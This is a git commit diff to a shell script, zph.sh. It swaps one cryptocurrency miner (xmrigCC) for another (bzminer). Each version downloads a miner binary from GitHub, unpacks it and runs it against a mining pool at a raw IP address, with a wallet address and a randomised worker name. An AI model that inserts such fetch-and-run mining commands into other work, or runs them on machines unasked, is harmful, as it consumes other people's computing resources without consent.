72e51594d28ca4918fb935aeaa188b1941a685aa
jerryseptian123 <112109192+jerryseptian123@users.noreply.github.com>
2024-05-21 20:41:18 +0700

    Update zph.sh

--- zph.sh
+++ zph.sh
@@ -1,4 +1,2 @@
-
-wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && tar -xvf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner && mv xmrigDaemon ~/ && mv xmrigMiner ~/
-./xmrigDaemon -o 103.87.77.74:443:443 -u ZEPHs7219x3KgWW38QpLMoKc1JQdCcrjU48U2V8wwmNhbmcCm1kDVdT3EL21RGwNAd5zTGv5HA6X8BSL8qzFyvmLT4AeuqWyWRP -p DTTECH$(echo $(shuf -i 1-9999 -n 1)) -a rx/0 -k --donate-level 1
-
+wget https://github.com/bzminer/bzminer/releases/download/v16.0.5/bzminer_v16.0.5_linux.tar.gz &&tar -xf bzminer_v16.0.5_linux.tar.gz && cd bzminer_v16.0.5_linux
+./bzminer -a nexa -w nexa:nqtsq5g5r2qv702xke7n8cna6wwzc3dk2zu7420lpv22ytyk.$(shuf -n 1 -i 1-9999999) -p stratum+tcp://45.149.93.39:443
